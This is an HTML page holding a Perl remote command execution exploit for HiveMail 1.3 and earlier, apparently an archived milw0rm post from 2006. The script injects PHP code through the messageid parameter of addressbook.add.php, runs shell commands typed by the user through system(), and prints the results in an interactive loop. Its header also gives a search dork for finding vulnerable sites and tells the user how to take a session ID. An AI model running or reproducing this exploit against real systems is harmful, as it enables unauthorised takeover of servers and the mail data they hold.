<html><head><title>HiveMail <= 1.3 (addressbook.add.php) Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl                                     #
#                                                   #
# HiveMail &lt;= 1.3 remote command execution exploit  #
#                                                   #
#################################################################################
#                                                                               #
# Advisory:                                                                     #
# http://www.gulftech.org/?node=research&amp;article_id=00098-02102006              #
#                                                                               #
# To get the hivesession:                                                       #
# log on hivemail with firefox then look at the hivesession number in the url.  #
# (yes i know...)                                                               #
#                                                                               #
#################################################################################
#                                                                      #
# Dork:                                                                #
# &quot;Already have an account?&quot; &quot;Enter your information below to log in.&quot; #
#                                                                      #
########################################################################
#               #
# coded by [Oo] #
#               #
#################


require LWP::UserAgent;
use URI;
use Getopt::Long;

$| = 1;  # fflush stdout after print

# Default options
# connection 
my $basic_auth_user = '';
my $basic_auth_pass = '';
my $proxy = '';
my $proxy_user = '';
my $proxy_pass = '';
my $conn_timeout = 15;

# general
my $host;
my $session;
 
 print &quot;\n[i] HiveMail &lt;= 1.3 remote command execution exploit\n&quot;;
 print &quot;[i] coded by [Oo]\n&quot;;
 

 # read command line options
 my $options = GetOptions (

 #general options
 'host=s'    =&gt; \$host, # input host to test.
 'session=s'    =&gt; \$session, # input host to test.
 # connection options
 'basic_auth_user=s' =&gt; \$basic_auth_user,
 'basic_auth_pass=s' =&gt; \$basic_auth_pass,
 'proxy=s'           =&gt; \$proxy,
 'proxy_user=s'      =&gt; \$proxy_user,
 'proxy_pass=s'      =&gt; \$proxy_pass,
 'timeout=i'         =&gt; \$conn_timeout);
 
 # command line sanity check 
 &amp;show_usage unless ($host);
 &amp;show_usage unless ($session);
 
 # main loop 
 while (1){
 	print &quot;\n[hivemail] &quot;;
 	my $cmd = &lt;STDIN&gt;;
 	hm_xploit ($cmd);
 }

 exit (1);

#exploit 
sub hm_xploit {
  chomp (my $data = shift);
  
  if ($data eq &quot;exit&quot;) { print &quot;\n[e] Exit!\n&quot;;exit(); }

  my $exp = $host.&quot;addressbook.add.php?hivesession=&quot;.$session.&quot;&amp;cmd=quick&amp;messageid=\&quot;);echo%20\&quot;start_er\&quot;;system(\$com);echo%20\&quot;end_er\&quot;;\@d(\&quot;&amp;popid=1&amp;com=&quot;.$data.&quot; &quot;;
  my $req = new HTTP::Request 'GET' =&gt; $exp;
 
  
  my $ua = new LWP::UserAgent;
  $ua-&gt;timeout($conn_timeout);

  if ($basic_auth_user){
    $req-&gt;authorization_basic($basic_auth_user, $basic_auth_pass) 
  }
  if ($proxy){
    $ua-&gt;proxy(['http'] =&gt; $proxy);
    $req-&gt;proxy_authorization_basic($proxy_user, $proxy_pass);
  }

	 
  my $res = $ua-&gt;request($req);
  my $show = $res-&gt;content;
  
  print&quot;\n&quot;;
  if ($show =~ m/start_er(.*?)end_er/ms) {
    my $out = $1;
    $out =~ s/^\s+|\s+$//gs;
    if ($out) {
      print &quot;$out\n&quot;;
    }
  }
  
}

# show options 
sub show_usage {
  print &quot;\n[*] Usage: ./hmail_exp.pl [options] [host] [session]\n&quot;;
  print &quot;[*] Options:\n&quot;;
  print &quot;\t--proxy (http), --proxy_user, --proxy_pass\n&quot;;
  print &quot;\t--basic_auth_user, --basic_auth_pass\n&quot;;
  print &quot;\t--timeout \n&quot;;
  print &quot;[*] Example:\n&quot;;
  print &quot;    hmail_exp.pl --host=http://127.0.0.1/hivemail/ --session=22ead72ecf6af376a801923466a23efa\n&quot;;
  exit(1);
}

# milw0rm.com [2006-05-06]</pre></html>